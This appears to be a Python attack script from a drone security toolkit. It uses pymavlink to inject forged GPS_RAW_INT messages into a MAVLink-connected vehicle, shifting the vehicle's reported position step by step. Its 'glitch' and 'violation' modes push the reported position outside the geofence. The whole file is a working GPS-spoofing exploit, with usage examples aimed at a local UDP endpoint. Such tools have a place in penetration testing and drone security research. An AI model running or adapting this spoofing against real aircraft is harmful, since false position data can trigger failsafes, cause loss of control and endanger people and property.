#!/usr/bin/env python3
"""
GPS Offset Glitching Exploit Script
Gradually shifts GPS position to trigger geofence violations
"""

import sys
import time
import math
from pymavlink import mavutil

def inject_gps_glitch(connection, start_lat, start_lon, end_lat, end_lon, 
                     steps=50, duration=30):
    """
    Gradually shift GPS position to trigger geofence violations
    
    Args:
        connection: MAVLink connection object
        start_lat: Starting latitude in degrees
        start_lon: Starting longitude in degrees
        end_lat: Target latitude in degrees
        end_lon: Target longitude in degrees
        steps: Number of steps for gradual shift
        duration: Total duration in seconds
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Convert to MAVLink format (degrees * 1e7)
    start_lat_int = int(start_lat * 1e7)
    start_lon_int = int(start_lon * 1e7)
    end_lat_int = int(end_lat * 1e7)
    end_lon_int = int(end_lon * 1e7)
    
    step_delay = duration / steps
    
    print(f"[*] Starting GPS offset glitch:")
    print(f"    Start: ({start_lat:.7f}, {start_lon:.7f})")
    print(f"    End: ({end_lat:.7f}, {end_lon:.7f})")
    print(f"    Steps: {steps}, Duration: {duration}s")
    print()
    
    for i in range(steps + 1):
        # Linear interpolation
        factor = i / steps
        current_lat_int = int(start_lat_int + (end_lat_int - start_lat_int) * factor)
        current_lon_int = int(start_lon_int + (end_lon_int - start_lon_int) * factor)
        
        current_lat = current_lat_int / 1e7
        current_lon = current_lon_int / 1e7
        
        # Send GPS_RAW_INT message
        connection.mav.gps_raw_int_send(
            int(time.time() * 1000) % 4294967295,  # Time
            3,  # Fix type: 3D
            current_lat_int,  # Latitude
            current_lon_int,  # Longitude
            100000,  # Altitude in mm (100m)
            50,  # HDOP in cm
            50,  # VDOP in cm
            0,  # Ground speed
            0,  # Course over ground
            12  # Satellite count
        )
        
        if i % 10 == 0 or i == steps:
            print(f"[{i}/{steps}] GPS: ({current_lat:.7f}, {current_lon:.7f})")
        
        time.sleep(step_delay)
    
    print("\n[+] GPS offset glitch completed")

def trigger_geofence_violation(connection, home_lat, home_lon, geofence_radius_m=100):
    """
    Trigger geofence violation by moving GPS outside geofence
    
    Args:
        connection: MAVLink connection object
        home_lat: Home latitude in degrees
        home_lon: Home longitude in degrees
        geofence_radius_m: Geofence radius in meters
    """
    # Calculate offset to move outside geofence
    # 1 degree latitude â‰ˆ 111 km
    # Move 2x geofence radius away
    offset_degrees = (geofence_radius_m * 2) / 111000.0
    
    end_lat = home_lat + offset_degrees
    end_lon = home_lon
    
    print(f"[*] Triggering geofence violation...")
    print(f"    Home: ({home_lat:.7f}, {home_lon:.7f})")
    print(f"    Geofence radius: {geofence_radius_m}m")
    print(f"    Moving to: ({end_lat:.7f}, {end_lon:.7f})")
    
    inject_gps_glitch(connection, home_lat, home_lon, end_lat, end_lon, steps=30, duration=15)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gps_offset_glitching.py <connection> [mode] [params...]")
        print("\nModes:")
        print("  glitch <start_lat> <start_lon> <end_lat> <end_lon> [steps] [duration]")
        print("  violation <home_lat> <home_lon> [radius]")
        print("\nExamples:")
        print("  python3 gps_offset_glitching.py udp:127.0.0.1:14550 glitch 37.7749 -122.4194 37.7750 -122.4195")
        print("  python3 gps_offset_glitching.py udp:127.0.0.1:14550 violation 37.7749 -122.4194 100")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else 'glitch'
    
    if mode not in ['glitch', 'violation']:
        print(f"[-] Unknown mode: {mode}")
        print("[*] Valid modes: glitch, violation")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Get current GPS position if not provided
    if mode == 'glitch':
        if len(sys.argv) < 6:
            print("[-] Missing parameters for glitch mode")
            print("[*] Usage: glitch <start_lat> <start_lon> <end_lat> <end_lon> [steps] [duration]")
            sys.exit(1)
        
        try:
            start_lat = float(sys.argv[3])
            if not -90 <= start_lat <= 90:
                raise ValueError("Start latitude must be between -90 and 90 degrees")
            start_lon = float(sys.argv[4])
            if not -180 <= start_lon <= 180:
                raise ValueError("Start longitude must be between -180 and 180 degrees")
            end_lat = float(sys.argv[5])
            if not -90 <= end_lat <= 90:
                raise ValueError("End latitude must be between -90 and 90 degrees")
            end_lon = float(sys.argv[6])
            if not -180 <= end_lon <= 180:
                raise ValueError("End longitude must be between -180 and 180 degrees")
            steps = int(sys.argv[7]) if len(sys.argv) > 7 else 50
            if steps < 1 or steps > 1000:
                raise ValueError("Steps must be between 1 and 1000")
            duration = float(sys.argv[8]) if len(sys.argv) > 8 else 30
            if duration < 0 or duration > 3600:
                raise ValueError("Duration must be between 0 and 3600 seconds")
        except (ValueError, TypeError, IndexError) as e:
            print(f"[-] Invalid parameter: {e}")
            sys.exit(1)
        
        inject_gps_glitch(connection, start_lat, start_lon, end_lat, end_lon, steps, duration)
        
    elif mode == 'violation':
        if len(sys.argv) < 5:
            print("[-] Missing parameters for violation mode")
            print("[*] Usage: violation <home_lat> <home_lon> [radius]")
            sys.exit(1)
        
        try:
            home_lat = float(sys.argv[3])
            if not -90 <= home_lat <= 90:
                raise ValueError("Home latitude must be between -90 and 90 degrees")
            home_lon = float(sys.argv[4])
            if not -180 <= home_lon <= 180:
                raise ValueError("Home longitude must be between -180 and 180 degrees")
            radius = float(sys.argv[5]) if len(sys.argv) > 5 else 100
            if radius < 1 or radius > 100000:
                raise ValueError("Radius must be between 1 and 100000 meters")
        except (ValueError, TypeError, IndexError) as e:
            print(f"[-] Invalid parameter: {e}")
            sys.exit(1)
        
        trigger_geofence_violation(connection, home_lat, home_lon, radius)
    else:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)

if __name__ == "__main__":
    main()
